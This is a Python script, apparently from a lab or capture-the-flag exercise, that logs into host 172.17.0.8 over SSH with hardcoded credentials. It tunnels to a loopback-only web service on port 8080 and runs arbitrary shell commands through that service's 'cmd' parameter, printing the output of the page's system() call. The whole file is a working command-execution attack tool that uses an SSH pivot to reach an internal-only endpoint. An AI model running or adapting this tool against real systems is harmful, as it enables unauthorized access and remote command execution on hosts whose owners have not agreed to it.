#!/usr/bin/env python3
"""
Run commands on the loopback-only 8080 vhost through the SSH tunnel.

Each invocation opens its own tunnel, so the tunnel request count is exactly
the number of commands executed. Nothing is cached between runs.
"""
import socket, sys, threading, time, urllib.request, urllib.parse

import paramiko

HOST, USER, PW = "172.17.0.8", "peter", "sp1der"
LOCAL_PORT = 18080
REMOTE = ("127.0.0.1", 8080)
count = [0]


def pump(src, dst):
    try:
        while True:
            d = src.recv(65536)
            if not d:
                break
            dst.sendall(d)
    except Exception:
        pass
    finally:
        for s in (src, dst):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            s.close()


def serve(srv, on_conn):
    srv.settimeout(0.5)
    while True:
        try:
            conn, addr = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            return
        threading.Thread(target=on_conn, args=(conn, addr), daemon=True).start()


def run(cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(HOST, username=USER, password=PW, timeout=15)
    tr = client.get_transport()
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", LOCAL_PORT))
    srv.listen(8)

    def on_conn(conn, addr):
        chan = tr.open_channel("direct-tcpip", REMOTE, addr)
        threading.Thread(target=pump, args=(conn, chan), daemon=True).start()
        threading.Thread(target=pump, args=(chan, conn), daemon=True).start()

    threading.Thread(target=serve, args=(srv, on_conn), daemon=True).start()
    time.sleep(0.4)

    q = urllib.parse.urlencode({"cmd": cmd})
    url = f"http://127.0.0.1:{LOCAL_PORT}/?{q}"
    try:
        r = urllib.request.urlopen(url, timeout=30)
        body = r.read().decode(errors="replace")
        status = r.status
    except Exception as e:
        body = f"TRANSPORT ERROR {type(e).__name__}: {e}"
        status = 0
    count[0] += 1

    srv.close()
    client.close()

    # strip the page chrome: keep only what system() emitted between <pre> tags
    out = body
    if "<pre>" in body and "</pre>" in body:
        out = body.split("<pre>", 1)[1].split("</pre>", 1)[0]
    print(f"[http={status}] [tunnel_requests_this_run={count[0]}]")
    print(out.strip())
    return body


if __name__ == "__main__":
    run(sys.argv[1])